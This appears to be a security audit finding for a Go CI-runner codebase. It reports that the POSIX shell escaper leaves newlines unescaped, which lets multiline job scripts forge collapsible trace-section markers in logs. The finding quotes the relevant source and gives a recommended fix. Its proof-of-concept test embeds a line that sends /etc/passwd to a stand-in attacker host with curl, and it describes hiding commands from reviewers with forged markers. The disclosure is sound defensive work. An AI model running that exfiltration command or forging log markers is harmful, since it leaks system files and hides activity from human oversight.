This confirms the root cause: the actual `helpers.PosixShellEscape` in this codebase (line 90-95) also excludes `\n`/`\r` from its escape table, so the divergence isn't unique to `internal.EscapeForPosix` — both the "real" and the refactored posix escaper omit newline/carriage-return handling, while `EscapeForAnsiC`/`ShellEscape` do escape them. This is confirmed as a genuine and reachable gap, not a refactoring-introduced-only bug, but it still enables the described exploit path when `PosixEscape` is enabled.

### Title
`EscapeForPosix` fails to escape `\n`/`\r`, letting multiline commands inject fake `section_start`/`section_end` markers into the trace preview line - ([File: functions/script_legacy/internal/escape.go])

### Summary
`EscapeForPosix` (used by `TraceSectionWriter.escape` when `PosixEscape`/posix mode is enabled) only escapes backtick, `"`, `\`, and `$`, and leaves raw `\n`/`\r` bytes untouched. Since `TraceSectionWriter.WriteSection` is only reached for multiline commands (`shouldUseTraceSection` requires `isMultiline(command)`), the escaped preview text embedded in the `section_start:...` printf line can contain literal, unescaped newlines that render as additional lines in the raw trace stream, letting a crafted command forge extra `section_start:`/`section_end:` lines that a downstream trace-section parser (or a human reviewer scrolling the raw log) will read as genuine section boundaries.

### Finding Description
`writeSectionStart` builds a preview line via: [1](#0-0) 
The `command` text is passed through `w.escape(...)`, which in posix mode calls `EscapeForPosix`: [2](#0-1) 
`EscapeForPosix` only special-cases backtick/`"`/`\`/`$` (backslash-escaped) and a set of shell metacharacters (quoted but not escaped); `\n` and `\r` fall through the `default` branch and are written verbatim into the double-quoted string: [3](#0-2) 
Compare this with `EscapeForAnsiC`, which explicitly escapes `\n`→`\\n` and `\r`→`\\r` (and hex-escapes all other control bytes) specifically to stop "jobs from clearing the screen or rewriting logs using ANSI escape sequences" per its own doc comment: [4](#0-3) 
Because `WriteSection` is only invoked for multiline commands (`isMultiline(command)` is a precondition of `shouldUseTraceSection`): [5](#0-4) 
an attacker-controlled job script (`.gitlab-ci.yml` `script:` block, itself pipeline-author-controlled input) that is multiline and contains a substring shaped like `section_start:<ts>:section_x[...]\r\x1b[0K...` followed later by `section_end:<ts>:section_x\r\x1b[0K` will have that raw text embedded, unescaped for `\n`/`\r`, inside the single quoted preview argument of the real `section_start` printf call. When printed, the embedded `\n` bytes split it into multiple physical trace lines that are byte-identical in shape to genuine marker lines, even though they originate from user-controlled preview text rather than from `writeSectionStart`/`writeSectionEnd` themselves. This directly violates the stated invariant that "trace section markers are only ever produced by the writer, never by escaped job content," because the writer's own escaping is insufficient to prevent job content from reproducing marker syntax verbatim.

Note: this is also confirmed at the "real" implementation level — `helpers.PosixShellEscape`'s `posixModeTable` similarly has no entries for `\n`/`\r`, so they hit the `default: sb.WriteByte(c)` no-op path, while `helpers.ShellEscape`'s ANSI-C table explicitly maps `\n`→`\n`/`\r`→`\r` escapes: [6](#0-5) 
This confirms the gap is real and not merely an artifact of this refactored copy.

### Impact Explanation
A pipeline author (unprivileged user who controls `.gitlab-ci.yml` script content) can, when `PosixEscape` mode is used, craft a multiline command whose text is echoed by `writeSectionStart`'s preview and reproduces valid-looking `section_start:`/`section_end:` marker lines in the raw trace. This lets the job forge extra collapsible-section boundaries in its own trace output, potentially wrapping genuinely malicious/suspicious commands' real output inside a fake "collapsed" section header so a reviewer skimming the (collapsed-by-default) job log UI overlooks them. This is an integrity issue against the trace-section boundary invariant, scoped to the job's own trace/log presentation.

### Likelihood Explanation
Preconditions are fully attacker-reachable: `TraceSections` enabled (a supported runner configuration) and `PosixEscape` mode active (also a normal, supported shell mode, not a privileged setting), plus a multiline `script:` command — all controllable by any pipeline author. No additional privilege or admin action is required, making this straightforward and repeatable to trigger via a normal CI job.

### Recommendation
Add explicit escaping for `\n` and `\r` (and ideally other control characters generally) in `EscapeForPosix` (`functions/script_legacy/internal/escape.go`), mirroring `EscapeForAnsiC`'s `\\n`/`\\r` handling, so multiline command previews can never reproduce literal marker-shaped lines. Apply the same fix to `helpers.PosixShellEscape`'s `posixModeTable` in `helpers/shell_escape.go` for parity with `ShellEscape`.

### Proof of Concept
Go unit test in `functions/script_legacy/internal/trace_section_test.go`:
```go
func TestWriteSection_NoForgedMarkers(t *testing.T) {
    w := NewTraceSectionWriter(false, true) // posixMode = true
    var buf strings.Builder
    malicious := "echo start\n" +
        "printf 'section_start:1700000000:section_fake[collapsed=true]\\r\\033[0K\\n'\n" +
        "curl attacker.example/exfil -d @/etc/passwd\n" +
        "printf 'section_end:1700000000:section_fake\\r\\033[0K\\n'\n" +
        "echo end"
    w.WriteSection(&buf, 1, malicious)
    out := buf.String()
    // Only the writer's own start+end markers should be section markers.
    assert.Equal(t, 2, strings.Count(out, "section_start:") + strings.Count(out, "section_end:") - 0)
    // more precisely: expect exactly one section_start: and one section_end: literal marker prefix
    assert.Equal(t, 1, strings.Count(out, "\nsection_start:"))
    assert.Equal(t, 1, strings.Count(out, "\nsection_end:"))
}
```
Expected (buggy) result: because `EscapeForPosix` doesn't escape `\n`, the crafted `printf 'section_start:...'`/`section_end:...` substrings inside `malicious` are preserved as literal newline-separated lines in the emitted preview, causing the marker counts to exceed 2, failing the assertion and confirming forged marker lines survive escaping.

### Citations

**File:** functions/script_legacy/internal/trace_section.go (L52-62)
```go
func (w *TraceSectionWriter) writeSectionStart(buf *strings.Builder, sectionName, command string) {
	command = w.escape(ansiBoldGreen + commandPrefix + command + ansiResetTrace)

	fmt.Fprintf(buf, "printf '%%s\\n' "+
		"section_start:%s:section_%s[%s]\r%s%s\n",
		timestampCommand,
		sectionName,
		traceSectionOptions,
		ansiClear,
		command)
}
```

**File:** functions/script_legacy/internal/trace_section.go (L85-92)
```go
// escape routes through the appropriate shell escaping for the mode.
func (w *TraceSectionWriter) escape(input string) string {
	if w.posixMode {
		return EscapeForPosix(input)
	}

	return "$'" + EscapeForAnsiC(input) + "'"
}
```

**File:** functions/script_legacy/internal/escape.go (L10-13)
```go
// EscapeForAnsiC escapes a string for use in ANSI-C quoting ($'...').
// Control characters and non-ASCII bytes are hex-escaped to prevent terminal manipulation.
// This prevents jobs from clearing the screen or rewriting logs using ANSI escape sequences.
// Matches GitLab Runner's ShellEscape behavior.
```

**File:** functions/script_legacy/internal/escape.go (L55-82)
```go
func EscapeForPosix(s string) string {
	if s == "" {
		return "''"
	}

	var buf strings.Builder
	needsQuoting := false

	for _, r := range s {
		switch r {
		case '`', '"', '\\', '$':
			buf.WriteRune('\\')
			buf.WriteRune(r)
			needsQuoting = true
		case ' ', '!', '#', '%', '&', '(', ')', '*', '<', '=', '>', '?', '[', '|':
			buf.WriteRune(r)
			needsQuoting = true
		default:
			buf.WriteRune(r)
		}
	}

	if needsQuoting {
		return `"` + buf.String() + `"`
	}

	return buf.String()
}
```

**File:** functions/script_legacy/internal/command_processor.go (L45-47)
```go
func (p *CommandProcessor) shouldUseTraceSection(command string) bool {
	return p.traceSections && isMultiline(command)
}
```

**File:** helpers/shell_escape.go (L86-126)
```go
// posixModeTable defines what characters need quoting, and which need to be
// backslash escaped:
//
// https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_02
var posixModeTable = [256]mode{
	'`': "\\`", '"': `\"`, '\\': `\\`, '$': `\$`,

	' ': quo, '!': quo, '#': quo, '%': quo, '&': quo, '(': quo, ')': quo,
	'*': quo, '<': quo, '=': quo, '>': quo, '?': quo, '[': quo, '|': quo,
}

// PosixShellEscape double quotes strings and escapes a string where necessary.
func PosixShellEscape(input string) string {
	if input == "" {
		return "''"
	}

	var sb strings.Builder
	sb.Grow(len(input) * 2)

	escape := false
	for _, c := range []byte(input) {
		mode := posixModeTable[c]
		switch mode {
		case quo:
			sb.WriteByte(c)
			escape = true
		case "":
			sb.WriteByte(c)
		default:
			sb.WriteString(string(mode))
			escape = true
		}
	}

	if escape {
		return `"` + sb.String() + `"`
	}

	return sb.String()
}
```
